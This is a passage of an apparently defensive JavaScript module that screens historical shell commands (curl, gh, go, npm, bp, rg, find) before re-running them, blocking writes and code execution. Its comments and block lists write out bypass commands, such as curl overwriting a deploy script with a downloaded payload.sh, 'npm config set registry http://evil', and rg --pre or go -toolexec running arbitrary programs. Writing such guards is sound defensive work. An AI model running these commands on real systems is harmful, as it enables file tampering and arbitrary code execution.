      if (pager) return `git grep ${pager} runs an arbitrary COMMAND as the pager over every matching file (proven: it executed a planted script with the match list as argv)`;
    }
    const guard = GIT_SUBVERB_GUARDS.get(verb);
    return guard ? guard(argv) : null;
  },
};

const CURL_BODY_FLAGS = ["-d", "--data", "--data-raw", "--data-binary", "--data-urlencode", "-F", "--form", "-T", "--upload-file"];

// SHORT FLAGS CLUSTER, AND THAT IS HOW THIS RULE FIRST FAILED OPEN.
//
// The original rule compared tokens exactly, so `-o` was caught and `-so` was
// not — and `curl -s https://…/payload.sh -so /opt/barkpark/deploy/
// site-deploy.sh` was ADMITTED by layer (b) AND missed by layer (c), whose
// pattern also demands a bare ` -o `. That command is D29's own named danger,
// clustered. The DANGER_SET tested only the unclustered spelling, so the
// measurement that exists to catch exactly this could not see it.
//
// So a single-dash token is EXPANDED into its letters before judging, and a
// value-taking letter is only honoured as the LAST in its cluster (that is how
// getopt works: `-so X` binds X to `o`, `-os X` does not bind at all). Long
// `--flag=value` forms are normalised the same way.
//
// The normaliser is GENERIC — it takes the tool's value-taking letters — because
// `curl` is not the only allowlisted head whose `-o` writes a file. Copying it
// per tool is how five hand-copies of one grammar drift apart, which is this
// epic's own named defect class.

/**
 * Expand `-so` into `["-s","-o"]`, `-o/tmp/x` into `["-o","/tmp/x"]`, and split
 * `--flag=v` into `["--flag","v"]`.
 *
 * @param {string[]} argv
 * @param {Set<string>} valueLetters short letters that take a value
 */
function normaliseArgv(argv, valueLetters) {
  const out = [];
  for (const t of argv) {
    if (/^--[^=]+=/.test(t)) {
      const at = t.indexOf("=");
      out.push(t.slice(0, at), t.slice(at + 1));
    } else if (/^-[A-Za-z]{2,}$/.test(t)) {
      const letters = [...t.slice(1)];
      letters.forEach((ch, i) => {
        // A value-taking letter mid-cluster consumes the REST of the cluster as
        // its value (`-oX` is `-o X`), so nothing after it is a flag.
        if (valueLetters.has(ch) && i < letters.length - 1) out.push(`-${ch}`, letters.slice(i + 1).join(""));
        else if (i === 0 || !valueLetters.has(letters[i - 1])) out.push(`-${ch}`);
      });
    } else if (/^-[A-Za-z]+[^A-Za-z]/.test(t)) {
      // A cluster with a NON-LETTER value attached: `-o/tmp/evil`, `-w%{code}`,
      // `-k2,2`. The `{2,}`-letters branch above cannot see these — its pattern
      // is letters-only — so `curl -so/tmp/evil https://x` was ADMITTED by both
      // layers. Same defect as the clustered `-so /tmp/evil` spelling, one
      // punctuation character further along.
      const [, cluster, attached] = t.match(/^-([A-Za-z]+)([^A-Za-z].*)$/);
      const letters = [...cluster];
      const at = letters.findIndex((ch) => valueLetters.has(ch));
      if (at < 0) {
        out.push(t);
      } else {
        for (let i = 0; i < at; i++) out.push(`-${letters[i]}`);
        out.push(`-${letters[at]}`, letters.slice(at + 1).join("") + attached);
      }
    } else {
      out.push(t);
    }
  }
  return out;
}

const CURL_VALUE_LETTERS = new Set(["o", "T", "d", "F", "X", "w", "H", "b", "c", "K", "E", "u", "A", "e", "D", "Y", "y", "m", "Z"]);
const CURL_WRITE_LETTERS = new Map([
  ["O", "-O writes a file named after the remote resource"],
  ["J", "-J writes a file named by the server's Content-Disposition"],
]);

const normaliseCurlArgv = (argv) => normaliseArgv(argv, CURL_VALUE_LETTERS);

/** curl flags whose VALUE is a path curl writes. Each is also a value LETTER or long flag whose value the normaliser eats. */
const CURL_FILE_TARGET_FLAGS = new Map([
  ["-D", "the response headers land in that path"],
  ["--dump-header", "the response headers land in that path"],
  ["-c", "the cookie jar is written to that path at exit"],
  ["--cookie-jar", "the cookie jar is written to that path at exit"],
  ["--trace", "the full protocol trace is written to that path"],
  ["--trace-ascii", "the full protocol trace is written to that path"],
  ["--stderr", "curl's stderr is redirected into that path"],
  ["--etag-save", "the response ETag is written to that path"],
  // THE SAME SWEEP, RUN AGAIN, FOUND THREE MORE. The block above closed `-D`,
  // `-c` and the four long-flag traces by asking "which flags name a path curl
  // WRITES?" and answering it from CURL_VALUE_LETTERS. That question is right and
  // the answer was short, because three of curl's write targets are LONG FLAGS
  // with no short letter at all, so they never appeared on the list the sweep
  // was derived from. Each wrote a real file on the authoring host (curl 8.7.1),
  // with `-o /dev/null` set so nothing else could:
  //
  //     curl -s -o /dev/null --libcurl <f> file:///etc/hosts   → 1687 bytes
  //     curl -s -o /dev/null --alt-svc <f> https://example.com/ →  117 bytes
  //     curl -s -o /dev/null --hsts    <f> https://example.com/ →  111 bytes
  //
  // `--alt-svc` and `--hsts` are read-write CACHE files: curl loads them at
  // start and REWRITES them at exit, so pointing one at a real file truncates
  // and replaces it.
  ["--libcurl", "curl writes a libcurl C source file to that path"],
  ["--hsts", "the HSTS cache is read AND REWRITTEN at that path on exit"],
  ["--alt-svc", "the Alt-Svc cache is read AND REWRITTEN at that path on exit"],
]);

const curlRule = {
  check(rawArgv) {
    const argv = normaliseCurlArgv(rawArgv);
    for (let i = 1; i < argv.length; i++) {
      const t = argv[i];
      if (t === "-X" || t === "--request") {
        const method = (arg(argv, i + 1) || "").toUpperCase();
        if (method !== "GET" && method !== "HEAD") return `curl -X ${method || "(missing)"} is a write method`;
      }
      if (CURL_BODY_FLAGS.includes(t)) return `curl ${t} sends a request body (a write)`;
      if (t === "-o" || t === "--output") {
        const dest = arg(argv, i + 1);
        if (dest !== "/dev/null") return `curl -o writes a file (${dest ?? "missing target"}); only \`-o /dev/null\` is admitted`;
      }
      // `--remote-name-all` is `-O` FOR EVERY URL and was absent from this list
      // while its singular spelling `--remote-name` was on it — one suffix
      // along, the same shape as findRule's missing `-fprint0`. Proven: `curl -s
      // --remote-name-all https://example.com/index.html` wrote `index.html`
      // into the working directory. Neither layer saw it: the layer-(c) regex
      // for `-O` matches a SHORT cluster, not a long flag.
      if (t === "--remote-name" || t === "--remote-name-all" || t === "--create-dirs" || t === "--output-dir" || t === "--remote-header-name") return `curl ${t} writes a file`;
      // `-w`/`--write-out` IS A WRITE PRIMITIVE, and its value was EATEN.
      //
      // `w` is in CURL_VALUE_LETTERS, so the normaliser consumed its argument
      // and no check ever read it — the exact failure mode the `-D`/`-c`/`-K`
      // block above names, on a fourth letter. Since curl 8.3 the write-out
      // format supports `%output{FILE}`, which REDIRECTS the rest of the format
      // into that file. Proven on this host (curl 8.7.1), with `-o /dev/null` set:
      //
      //     curl -s -o /dev/null -w "%output{<f>}PWNED-D4" file:///etc/hosts
      //     $ cat <f> → PWNED-D4
      //
      // A leading `@` makes the value a FORMAT FILE the screen never reads —
      // which may itself carry `%output{…}`. Same ruling as `curl -K` and
      // `sed -f`: the hazard is the file's POWER, not its unreadability.
      //
      // REACH COST, MEASURED: the corpus carries 12 `curl -w` rows and every one
      // is a `%{http_code}`-style status format. None uses `%output{` or `@`, so
      // all 12 stay admitted — this refuses the write, never the flag.
      if (t === "-w" || t === "--write-out") {
        const fmt = arg(argv, i + 1) ?? "";
        if (fmt.includes("%output{")) return `curl ${t} ${fmt} uses %output{…}, which WRITES the rest of the format to that file`;
        if (fmt.startsWith("@")) return `curl ${t} ${fmt} reads a FORMAT FILE the screen never sees — it may carry \`%output{…}\`, which writes a file`;
      }
      // `-K`/`--config` reads a file of curl options the screen never sees, and
      // that file may carry EVERY option this rule refuses. Proven on this host:
      // a config containing `output = "/tmp/CURL_K_MARK"` wrote the response
      // body to disk. `-K` is in CURL_VALUE_LETTERS, so the rule ate its value
      // and never examined it — the guard's own normaliser carried the bypass.
      if (t === "-K" || t === "--config") return `curl ${t} reads an options FILE the screen never sees — it may carry \`output\`, \`-o\`, \`--data\` or any other refused option`;
      // FOUR MORE VALUE LETTERS THAT WRITE A FILE, and the reason they were all
      // missed at once: CURL_VALUE_LETTERS is the list of letters whose value is
      // EATEN, and the write check above is a separate, SHORTER list. Every
      // letter on the first list and not the second has its target consumed by
      // the module's own normaliser and never examined. `D`, `c` and `K` are all
      // on the first list. Proven live on this host, each writing a real file:
      //     curl -o /dev/null -D /tmp/CURL_D_MARK https://example.com/  → 246 bytes
      //     curl -o /dev/null -c /tmp/CURL_C_MARK https://example.com/  → 131 bytes
      // `--trace`/`--trace-ascii`/`--stderr`/`--etag-save` are the same shape on
      // documented flags. `/dev/null` stays admitted for each, exactly as it is
      // for `-o` — the guard targets the WRITE, never the flag.
      //
      // `--xattr` was CHECKED and deliberately NOT added: it writes extended
      // attributes onto the SAVED FILE, so it can only write when a file target
      // exists, and every file target is already refused above. A separate rule
      // for it would be cry-wolf on a flag that cannot act alone.
      if (CURL_FILE_TARGET_FLAGS.has(t)) {
        const dest = arg(argv, i + 1);
        if (dest !== "/dev/null") return `curl ${t} WRITES a file (${dest ?? "missing target"}) — ${CURL_FILE_TARGET_FLAGS.get(t)}; only \`${t} /dev/null\` is admitted`;
      }
      if (/^-[A-Za-z]$/.test(t) && CURL_WRITE_LETTERS.has(t[1])) return `curl ${CURL_WRITE_LETTERS.get(t[1])}`;
    }
    return null;
  },
};

const BP_WRITE_VERBS = new Set([
  "create", "publish", "patch", "delete", "close", "claim", "stamp", "pulse", "set", "update",
  "rm", "add", "import", "apply", "deploy", "login", "logout", "init", "run", "next", "reopen",
  // `bp cloud workspace export … --file default-a.tar` writes a tarball to disk
  // and was ADMITTED by the first draft of this rule. Found by auditing the
  // admitted side of the corpus — the side a refusal-focused review never reads.
  "export", "restore", "sync", "install", "uninstall",
]);

// bp talks to whatever server `-s` names. A census re-running historical bp
// commands must not re-point at a remote instance carrying somebody's admin
// token, so the server flag is bounded to loopback.
const LOOPBACK_URL = /^https?:\/\/(localhost|127\.0\.0\.1|\[::1\])(:\d+)?(\/|$)/i;

// ─────────────────────────────────────────────────────────────────────────────
// BP'S WRITE SET WAS HAND-WRITTEN, AND BP PUBLISHES ITS OWN
// ─────────────────────────────────────────────────────────────────────────────
//
// BP_WRITE_VERBS above is 26 verbs somebody typed out. `bp capabilities -o json`
// is the CLI's own machine-readable manifest, and every command in it carries a
// `writes` boolean — the server's own answer to the exact question this rule
// asks. Diffed:
//
//     156 bp commands, 97 of them declared WRITING, 80 distinct verbs
//     64 of those 80 verbs were absent from the hand-written set
//     62 writing commands were ADMITTED by the shipped screen
//
// Not obscure ones. `bp doc mutate` is a raw ledger write; `bp secret
// scoped-set` writes a SECRET; `bp auth mfa-disable` and `bp auth reset` are
// account takeovers; `bp access grant`/`revoke`, `bp token revoke`, `bp doc
// unpublish`, `bp doc discard-draft`, `bp doc restore-revision`, `bp cycle
// seal`, `bp media upload` — all admitted by a rule whose entire job is to stop
// a census re-running history from mutating the ledger.
//
// A HAND-WRITTEN LIST OF ANOTHER PROGRAM'S VERBS IS THE DEFECT, not its length.
// So the set is DERIVED and committed as
// tooling/grip/fixtures/bp-write-commands.json, with the regeneration command in
// its own `note` field, and test/screen.test.mjs asserts the source below covers
// every pair in it — a `bp` release that adds a writing command reds the suite
// instead of silently widening what the census may run.
//
// WHY PAIRS AND NOT BARE VERBS. BP_WRITE_VERBS is scanned over EVERY token, and
// bp's writing verbs include `open`, `log`, `move`, `stage`, `touch`, `result`,
// `release`, `reset` and `settings` — words that appear as ordinary ARGUMENTS in
// honest reads (`bp task ready --status open`). Scanning those flat would be the
// cry-wolf this module is measured against. The manifest gives the noun too, so
// the pair `<noun> <verb>` is matched at the two positions bp's own grammar puts
// them, after the value-taking globals are dropped. The flat BP_WRITE_VERBS scan
// SURVIVES underneath as the second layer, unchanged.
//
// MEASURED COST: exactly one admitted corpus row is newly refused —
// `bp task move <a> <b> --dry-run`. `bp task move` writes; the screen does not
// get to trust a flag to make a write verb safe, for the same reason it does not
// trust `--dry-run` anywhere else.

/** bp's value-taking globals — dropped so `bp -s <url> doc mutate` lands noun/verb correctly. */
const BP_VALUE_GLOBALS = new Set([
  "-s", "--server", "-d", "--dataset", "-o", "--output", "--token", "--set", "--file",
  "--manifest", "--limit", "--offset", "--criterion", "--criterion-text", "--evidence", "--now",
]);

/**
 * DERIVED from `bp capabilities -o json` — see the fixture's `note` for the
 * exact command. Do not hand-edit: regenerate, and the test will confirm.
 */
export const BP_WRITE_COMMANDS = new Set([
  "access claim", "access grant", "access revoke", "auth login", "auth logout",
  "auth mfa-disable", "auth mfa-enroll", "auth mfa-verify", "auth register",
  "auth request-reset", "auth reset", "auth verify-email", "bulldocs intent-processed",
  "bulldocs patch", "bulldocs propose", "bulldocs publish", "chat approve", "chat archive",
  "chat create-session", "chat interrupt", "chat send-message", "chat unarchive",
  "chat update-session", "cycle assign", "cycle open", "cycle promote", "cycle quarantine",
  "cycle release-gate-activate", "cycle release-gate-open", "cycle release-paper-stage",
  "cycle result", "cycle rollback", "cycle seal", "doc create", "doc create-if-not-exists",
  "doc create-or-replace", "doc delete", "doc discard-draft", "doc mutate", "doc patch",
  "doc publish", "doc restore-revision", "doc unpublish", "fleet beat", "github adopt",
  "media add-member", "media checkout", "media delete", "media remove-member",
  "media revoke-share", "media share-collection", "media undo-checkout", "media update",
  "media upload", "plugin settings", "schema apply", "schema delete", "secret rm",
  "secret scoped-rm", "secret scoped-set", "secret set", "session link-task", "session log",
  "session open", "session publish", "session touch", "share add", "share rm", "task claim",
  "task close", "task move", "task next", "task pulse", "task release", "task stage",
  "task stamp", "ticket answer", "ticket close", "ticket-key mint", "ticket-key pause",
  "ticket-key revoke", "ticket-key rotate", "ticket-key unpause", "token create", "token revoke",
  "webhook create", "webhook delete", "webhook reenable", "webhook replay", "webhook rotate",
  "webhook test-send", "webhook update", "workspace create", "workspace member-add",
  "workspace member-rm", "workspace member-role", "workspace project-create",
]);

const bpRule = {
  check(rawArgv) {
    // The original flat scan runs FIRST and is unchanged, so every refusal it
    // already diagnosed keeps its exact wording (screen.test.mjs asserts on
    // several of those strings by name). The manifest-derived pair check below
    // only reaches commands this loop had nothing to say about.
    for (let i = 1; i < rawArgv.length; i++) {
      const argv = rawArgv;
      const t = argv[i];
      const bare = t.replace(/^--?/, "");
      if (BP_WRITE_VERBS.has(bare)) return `bp write verb "${bare}" mutates the ledger or writes a file`;
      // NB: `-o` on bp is the OUTPUT FORMAT (`-o json`), not a file — the single
      // most common honest bp read shape in the corpus. Listing it here cost 13
      // false refusals in one draft; `--file`/`--out`/`--output` are the writers.
      if (t === "--file" || t === "--out" || t === "--output" || /^--(file|out|output)=/.test(t)) return `bp ${t} writes a file`;
      // `--server=<url>` is the same flag as `-s <url>`; comparing tokens exactly
      // let the `=` spelling walk straight past the loopback bound.
      if (t === "-s" || t === "--server" || /^--server=/.test(t)) {
        const url = t.startsWith("--server=") ? t.slice("--server=".length) : arg(argv, i + 1);
        if (!url || !LOOPBACK_URL.test(url)) return `bp -s ${url ?? "(missing)"} points at a non-loopback server`;
      }
    }
    // THEN the manifest-derived `<noun> <verb>` pair, at the two positions bp's
    // own grammar puts them, with the value-taking globals dropped first so
    // `bp -s <url> doc mutate` still lands on `doc mutate`.
    const argv = dropValueGlobals(rawArgv, BP_VALUE_GLOBALS);
    const noun = firstNonFlag(argv);
    if (noun !== null) {
      const verb = firstNonFlag(argv, argv.indexOf(noun) + 1);
      if (verb !== null && BP_WRITE_COMMANDS.has(`${noun} ${verb}`)) {
        return `bp ${noun} ${verb} is declared WRITING by bp's own capabilities manifest`;
      }
    }
    return null;
  },
};

const GH_WRITE_VERBS = new Set([
  "create", "close", "merge", "edit", "comment", "delete", "rerun", "cancel", "review", "ready",
  "reopen", "lock", "unlock", "transfer", "rename", "sync", "upload", "checkout",
]);

// gh's NOUNS are allowlisted, and each noun's read sub-verbs with them. The
// first draft carried only the GH_WRITE_VERBS denylist above, which admitted
// `gh repo clone <repo> /tmp/x` and `gh release download` — both writes, and
// both a denylist-shaped hole inside a module whose entire thesis is that a
// denylist cannot be complete. The denylist SURVIVES as a second check, because
// a write verb reaching an allowlisted noun (`gh pr comment`) must still refuse.
//
// Corpus reach is preserved exactly: the 23 gh commands in the frozen corpus use
// only `api`, `pr view/list/checks`, `issue view/list` and `run view/list`.
const GH_READ_NOUNS = new Map([
  ["api", null], // any path; the -X / -f guards below bound it
  ["pr", new Set(["view", "list", "checks", "diff", "status"])],
  ["issue", new Set(["view", "list", "status"])],
  ["run", new Set(["view", "list", "watch"])],
  ["repo", new Set(["view", "list"])],
  ["release", new Set(["view", "list"])],
  ["workflow", new Set(["view", "list"])],
  ["cache", new Set(["list"])],
  ["search", null],
  ["auth", new Set(["status"])],
  ["label", new Set(["list"])],
  ["browse", null],
  ["status", null],
  ["version", null],
]);

// gh's value-taking pre-verb global — the THIRD head of the same bug #13346
// fixed for docker/pnpm (and this wave fixed for systemctl). `gh -R status
// repo clone owner/repo /tmp/evil` ADMITTED (confirmed live on origin/main):
// `-R`'s separate-token value `status` collided with the read noun `status`
// (which needs no sub-verb, per GH_READ_NOUNS), so `noun` resolved to
// "status" and the real noun/sub-verb pair `repo clone` — a write that clones
// an arbitrary repository to disk — was never checked against
// GH_READ_NOUNS at all, and `clone` is not in the GH_WRITE_VERBS denylist
// either (that loop is a second-layer catch, not the gate). `-R`/`--repo`
// is gh's global "run this command against OWNER/REPO" flag and is the only
// pre-verb global gh's root command takes.
//
// ghRule is a BESPOKE object, not built on the `verbRule` factory — it has a
// second level (noun → allowed sub-verbs) that `verbRule` does not model, the
// same shape as `npmRule`. So it cannot receive #13346's fix by threading
// `valueGlobals` through the factory; it needs the same `dropValueGlobals`
// defence applied explicitly, exactly as `gitRule`/`npmRule`/`goRule` already
// do for their own bespoke checks.
const GH_VALUE_GLOBALS = new Set(["-R", "--repo"]);

const ghRule = {
  check(rawArgv) {
    const argv = dropValueGlobals(rawArgv, GH_VALUE_GLOBALS);
    const noun = firstNonFlag(argv);
    if (noun === null) return "gh without a sub-verb";
    if (!GH_READ_NOUNS.has(noun)) {
      return `gh noun "${noun}" is not on the read-only allowlist (${[...GH_READ_NOUNS.keys()].sort().join(", ")})`;
    }
    const subs = GH_READ_NOUNS.get(noun);
    if (subs) {
      const sub = firstNonFlag(argv, argv.indexOf(noun) + 1);
      if (sub === null) return `gh ${noun} without a sub-verb — requires one of: ${[...subs].sort().join(", ")}`;
      if (!subs.has(sub)) return `gh ${noun} sub-verb "${sub}" is not read-only (${[...subs].sort().join(", ")})`;
    }
    for (let i = 1; i < argv.length; i++) {
      const t = argv[i];
      if (t === "-X" || t === "--method") {
        const method = (arg(argv, i + 1) || "").toUpperCase();
        if (method !== "GET" && method !== "HEAD") return `gh api -X ${method || "(missing)"} is a write method`;
      }
      if (t === "-f" || t === "--field" || t === "--raw-field" || t === "-F" || t === "--input") return `gh ${t} sends a request body (a write)`;
      if (GH_WRITE_VERBS.has(t)) return `gh write verb "${t}"`;
    }
    return null;
  },
};

// go's flags are SINGLE-DASH LONG NAMES that also take `=value`, and the rule
// compared TOKENS EXACTLY: `hasFlag(argv, "-o", "-exec")`. That is why
// `go test -c -o /tmp/evil` was already correctly refused (the bare `-o` token
// is there) while `go test -c` ALONE, and every `-flag=value` profiling flag,
// sailed straight through. Live-proven writes on the admitted side: `go test -c
// -o` produced a 4.1MB binary and `-coverprofile=` produced a real file.
//
// So the flag NAME is normalised — leading dashes stripped, truncated at `=` —
// and compared against a set of names. Name equality, not prefix matching: that
// is what keeps `-cover` (a stdout summary, admitted) distinct from `-c`
// (compile a test binary to disk, refused) and `-coverprofile=` (a file,
// refused). Prefix matching would have collapsed all three.
// `-exec` WAS ON THIS LIST AND ITS TWO SIBLINGS WERE NOT. `-exec` is refused as
// "runs an arbitrary binary", and go has two more flags that do exactly that,
// on the two verbs this rule ADMITS. Proven on the authoring host with a
// throwaway module:
//
//     go test -toolexec=<cmd> ./...   → <cmd> ran 8 times, first with
//                                       …/pkg/tool/darwin_arm64/compile, and
//                                       `ok probe 0.143s` — the test still PASSED
//     go vet  -vettool=<cmd>  ./...   → <cmd> ran, argv `-flags`
//
// `-toolexec` interposes on EVERY toolchain invocation and `-vettool` replaces
// the vet binary itself; both take an arbitrary path and both were ADMITTED in
// the `=` and the separate spelling. `-testlog` is the same sweep's file write:
// `go test -testlog=<f>` writes <f>. Names, not prefixes, exactly as the block
// above requires — `-test.v` and `-tags` must stay admitted.
//
// REACH COST, MEASURED: 0 of the 651 frozen corpus commands use any of the three.
const GO_WRITE_FLAGS = new Set([
  "c", "o", "exec", "toolexec", "vettool", "testlog",
  "coverprofile", "cpuprofile", "memprofile", "blockprofile", "mutexprofile", "trace", "outputdir",
]);

/** `-coverprofile=/tmp/x` → "coverprofile"; `./...` → null. */
const goFlagName = (t) => (/^--?[^-]/.test(t) ? t.replace(/^-+/, "").split("=")[0] : null);

// go's only PRE-verb global is `-C dir` (go 1.20+): `go -C env run main.go` runs
// `go run` — code execution — in directory `env`, and the eaten `env` read as the
// sub-verb. Build flags like `-c`/`-o` come AFTER the verb and are NOT globals.
const GO_VALUE_GLOBALS = new Set(["-C"]);

const goRule = {
  check(rawArgv) {
    const argv = dropValueGlobals(rawArgv, GO_VALUE_GLOBALS);
    const verb = firstNonFlag(argv);
    const allowed = new Set(["test", "vet", "list", "version", "env", "doc", "fmt"]);
    if (verb === null) return "go without a sub-verb";
    if (!allowed.has(verb)) return `go sub-verb "${verb}" is not on the read-only allowlist (${[...allowed].sort().join(", ")})`;
    if (verb === "fmt" && !hasFlag(argv, "-n", "-l")) return "go fmt REWRITES files unless run with -n/-l";
    // `go env -w` / `-u` rewrite the persistent go env file for every later build.
    if (verb === "env" && hasFlag(argv, "-w", "-u")) return "go env -w/-u REWRITES the persistent go environment file";
    for (let i = 1; i < argv.length; i++) {
      const name = goFlagName(argv[i]);
      if (name && GO_WRITE_FLAGS.has(name)) return `go -${name} writes a file or runs an arbitrary binary`;
    }
    return null;
  },
};

// mixRule checked only `verb === "test"` and never looked at a flag, so the two
// mix test flags that write coverage artefacts to disk were admitted.
const MIX_TEST_WRITE_FLAGS = ["--cover", "--export-coverage"];

const mixRule = {
  check(argv) {
    const verb = firstNonFlag(argv);
    if (verb === null) return "mix without a task";
    if (verb !== "test") return `mix task "${verb}" is not on the read-only allowlist (only \`mix test\`)`;
    const bad = argv.find((t) => MIX_TEST_WRITE_FLAGS.some((f) => t === f || t.startsWith(`${f}=`)));
    if (bad) return `mix test ${bad} WRITES coverage output to disk`;
    return null;
  },
};

// npm was registered as a bare `verbRule`, which reads the TOP-LEVEL verb and
// stops. `config` and `version` are both on that read-only list and both have
// WRITING sub-verbs underneath them, so every one of those sub-verbs was
// admitted by a rule that never looked:
//
//   npm config set registry http://evil   writes .npmrc — and repoints every
//                                         later install at an attacker registry
//   npm version patch                     writes package.json AND, by npm's own
//                                         default, git-commits and git-tags it
//
// So npm gets a dedicated rule with a second level. Same shape as `ghRule`, and
// for the same reason: a head whose sub-verb is not the whole story.
const NPM_READ_VERBS = new Map([
  ["ls", null],
  ["view", null],
  ["info", null],
  ["outdated", null],
  ["why", null],
  ["root", null],
  ["bin", null],
  ["config", new Set(["get", "list", "ls"])],
  // `version` is admitted BARE (it prints versions) and refused with any
  // positional (that positional is a bump, and a bump is three writes).
  ["version", null],
]);

// npm's value-taking globals that precede the command. `npm --prefix ls install`
// runs `npm install` (postinstall code execution) with the prefix set to a
// directory named `ls`, and the eaten `ls` read as the sub-verb. `-C` is npm's
// own alias for `--prefix`; the rest are the config paths/names that also eat a
// value. Booleans (`-g`, `--json`, `--long`) are NOT here — eating their neighbour
// would falsely refuse an honest read.
//
// npm's grammar makes this set UNCLOSEABLE by enumeration, and that is the
// finding rather than a caveat: npm accepts `--<any-config-key> <value>` before
// the command for EVERY non-boolean key in its config schema — roughly a hundred
// of them — so the seven above are a sample, not a set. Proven live on this
// host, each printing `ls` (the eaten value) from the command that then RAN:
//
//     npm --tag          ls config get tag           → ls
//     npm --otp          ls config get otp           → ls
//     npm --script-shell ls config get script-shell  → ls
//
// so `npm --tag ls publish` publishes, and `npm --script-shell ls run build`
// executes a package script — both ADMITTED before this change, and neither
// caught by the layer-(c) write-shape backstop (its regex names `install`, not
// `publish`/`run`). The named keys below are the proven ones; NPM_WRITE_VERBS is
// what actually holds the line for the ninety-odd unnamed.
const NPM_VALUE_GLOBALS = new Set([
  "--prefix", "-C", "-w", "--workspace", "--userconfig", "--globalconfig", "--cache",
  "--registry", "--loglevel", "--tag", "--otp", "--script-shell", "--node-options",
  "--omit", "--include", "--depth", "--cache-min", "--before", "--user-agent",
]);

/**
 * npm verbs that write, publish, or execute. Deliberately EXCLUDES the nine
 * NPM_READ_VERBS keys — `config` and `version` are admitted at the top level and
 * bounded by their own second-level guards (`npm config set`, `npm version
 * patch`), so denying them here would break those rules rather than reinforce
 * them, and `set`/`patch` are denied instead.
 */
const NPM_WRITE_VERBS = new Set([
  "install", "i", "add", "ci", "install-test", "install-ci-test", "publish", "unpublish",
  "run", "run-script", "exec", "x", "link", "unlink", "uninstall", "remove", "rm", "r", "un",
  "update", "up", "upgrade", "dedupe", "ddp", "find-dupes", "prune", "pack", "init", "create",
  "set", "adduser", "login", "logout", "token", "star", "unstar", "deprecate", "dist-tag",
  "owner", "access", "audit", "rebuild", "rb", "restart", "start", "stop", "test", "edit",
  "explore", "hook", "org", "profile", "team", "diff", "pkg", "sbom", "doctor",
]);

const npmRule = {
  check(rawArgv) {
    const argv = dropValueGlobals(rawArgv, NPM_VALUE_GLOBALS);
    const verb = firstNonFlag(argv);
    const names = [...NPM_READ_VERBS.keys()].sort().join(", ");
    if (verb === null) return `npm without a sub-verb — npm requires one of: ${names}`;
    if (!NPM_READ_VERBS.has(verb)) return `npm sub-verb "${verb}" is not on the read-only allowlist (${names})`;
    const after = firstNonFlag(argv, argv.indexOf(verb) + 1);
    const subs = NPM_READ_VERBS.get(verb);
    if (subs && after !== null && !subs.has(after)) {
      return `npm ${verb} sub-verb "${after}" is not read-only (only ${[...subs].sort().join(", ")}) — \`npm config set\` rewrites .npmrc`;
    }
    if (verb === "version" && after !== null) {
      return `npm version ${after} WRITES package.json and, by npm's own default, commits and tags it — only bare \`npm version\` reads`;
    }
    // SECOND LAYER over the RAW argv — see writeVerbBackstop. npm needs it more
    // than any other head: its value-taking pre-verb set is unenumerable.
    return writeVerbBackstop(rawArgv, NPM_WRITE_VERBS, "npm");
  },
};

const killRule = {
  check(argv) {
    if (arg(argv, 1) !== "-0") return "kill is admitted only as a liveness probe (`kill -0 <pid>`)";
    return null;
  },
};

// ─────────────────────────────────────────────────────────────────────────────
// PROGRAM INDIRECTION — the ENV spelling was closed; the FLAG spelling was not
// ─────────────────────────────────────────────────────────────────────────────
//
// `envAssignmentReason` exists for exactly one hazard, and states it in its own
// refusal text: "a prefix like GIT_EXTERNAL_DIFF=, GIT_PAGER=, PAGER=,
// NODE_OPTIONS= or PATH= changes WHICH PROGRAM the allowlisted head runs, which
// voids the head allowlist entirely." DANGER_SET carries three of those rows by
// name.
//
// EVERY ONE OF THOSE HEADS ALSO TAKES A FLAG THAT DOES THE SAME THING, and the
// flag spelling was admitted. Executed on the authoring host, each one writing
// /tmp/<MARK> carrying live `id` output — the same primitive, and the same proof
// shape, as the `$(id > /tmp/DQ_MARK)` hole wave 5 closed:
//
//   rg --pre <cmd> PATTERN DIR      ran <cmd> per file        → /tmp/RG_PRE_MARK
//   rg --hostname-bin <cmd> …       ran <cmd>                 → /tmp/RG_HB_MARK
//   git -c diff.external=<cmd> diff ran <cmd> per file        → /tmp/GIT_XDIFF_MARK
//   curl -K <config> URL            the config's `output =` wrote the response
//                                   to disk — the very thing `curl -o` is
//                                   refused for, one indirection away
//                                                             → /tmp/CURL_K_MARK
//   find . -fprint0 <file>          wrote <file>              → /tmp/FIND_MARK
//
// `rg`, `ag` and `ack` were `plainRule()` — filed under "searching + shaping
// text (none of these can execute a string)". That comment is the same WRONG
// QUESTION the sort/uniq/tree block above names: none of them executes a
// STRING, and `rg --pre` executes a FILE. `curl -K` and `find -fprint0` are
// misses of a different kind — `-K` is IN `CURL_VALUE_LETTERS`, so the rule
// carefully eats its value and never looks at it, and findRule's list carries
// `-fprint`, `-fprintf` and `-fls` but not `-fprint0`, one character along.
//
// THE SHAPE, so the next head is checked rather than assumed: a flag whose VALUE
// is a PROGRAM the tool will run, or a CONFIG/SCRIPT FILE the screen never
// reads. `sedRule` already refuses exactly this for `sed -f` ("runs a script
// FILE the screen never sees") — it was the one place the shape was recognised,
// and it was never generalised.
//
// CHECKED AND CLEARED, not skipped: `jq -f` and `grep -f` also name a file the
// screen never reads, and both stay ADMITTED — jq's language has no write or
// exec form at all, and grep's `-f` file is a list of PATTERNS, not a program.
// The hazard is the file's POWER, not its unreadability.
//
// REACH COST, MEASURED: 0 of the 651 frozen corpus commands use `git -c`, `rg`,
// `ag`, `ack`, `curl -K`, `--compress-program`, `--pre` or `--pager` at all.

/** @param {string} head @param {Map<string,string>} flags flag → why it is refused */
const indirectionRule = (head, flags) => ({
  check(argv) {
    for (let i = 1; i < argv.length; i++) {
      const name = argv[i].split("=")[0];
      if (flags.has(name)) return `${head} ${name} ${flags.get(name)}`;
    }
    return null;
  },
});

const RG_INDIRECTION = new Map([
  ["--pre", "runs an arbitrary COMMAND on every input file (proven: it wrote a marker carrying live `id` output)"],
  ["--hostname-bin", "runs an arbitrary COMMAND to resolve the hostname (proven the same way)"],
  ["--pager", "runs an arbitrary COMMAND as the pager"],
]);

const findRule = {
  check(argv) {
    for (const t of argv) {
      // `-fprint0` was absent from this list while `-fprint`, `-fprintf` and
      // `-fls` were on it — one character further along, and it WROTE the file
      // when run on this host.
      if (["-exec", "-execdir", "-ok", "-okdir", "-delete", "-fprint", "-fprint0", "-fprintf", "-fls"].includes(t)) {
        return `find ${t} executes or writes`;
      }
    }
    return null;
  },
};

const commandRule = {
  check(argv) {
    if (arg(argv, 1) !== "-v" && arg(argv, 1) !== "-V") return "`command` is admitted only as `command -v <name>`";
    return null;
  },
};

// ── THE TEXT TOOLS THAT WRITE ────────────────────────────────────────────────
//
